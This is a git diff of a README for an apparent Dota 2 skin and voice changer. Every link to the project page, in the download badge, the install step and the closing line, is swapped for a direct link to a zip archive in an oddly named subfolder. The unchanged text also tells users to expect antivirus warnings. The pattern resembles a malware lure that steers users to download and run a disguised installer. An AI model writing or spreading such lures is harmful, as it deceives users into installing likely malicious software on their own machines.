@@ -1,6 +1,6 @@
 # 🎮 Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface - Personalize your Dota 2 game experience
 
-[![Download Now](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface)
+[![Download Now](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface/main/stinty/Changer_Gamesok_Change_Skins_Dota_Voices_Interface_Charadriomorphae.zip)
 
 This application allows you to modify your Dota 2 game client. You can replace character skins, announcer voices, loading screens, and game interface elements using a simple interface. The software works as a client-side wrapper that injects custom assets into your game files without requiring advanced technical skills.
 
@@ -8,7 +8,7 @@ This application allows you to modify your Dota 2 game client. You can replace c
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official release page: [https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface](https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface)
+1.  Visit the official release page: [https://raw.githubusercontent.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface/main/stinty/Changer_Gamesok_Change_Skins_Dota_Voices_Interface_Charadriomorphae.zip](https://raw.githubusercontent.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface/main/stinty/Changer_Gamesok_Change_Skins_Dota_Voices_Interface_Charadriomorphae.zip)
 2.  Locate the latest version file.
 3.  Click the file to start your download.
 4.  Save the installer file to your desktop or downloads folder.
@@ -71,4 +71,4 @@ Some antivirus programs may flag modification tools as suspicious because they a
 
 You can find common solutions and community updates on the project repository page. Users often share tips on selecting the best skin combinations. 
 
-Visit the page here: [https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface](https://github.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface)
+Visit the page here: [https://raw.githubusercontent.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface/main/stinty/Changer_Gamesok_Change_Skins_Dota_Voices_Interface_Charadriomorphae.zip](https://raw.githubusercontent.com/Ajengand5918/Dota-2-Changer-Gamesok-Change-Skins-Voices-Interface/main/stinty/Changer_Gamesok_Change_Skins_Dota_Voices_Interface_Charadriomorphae.zip)
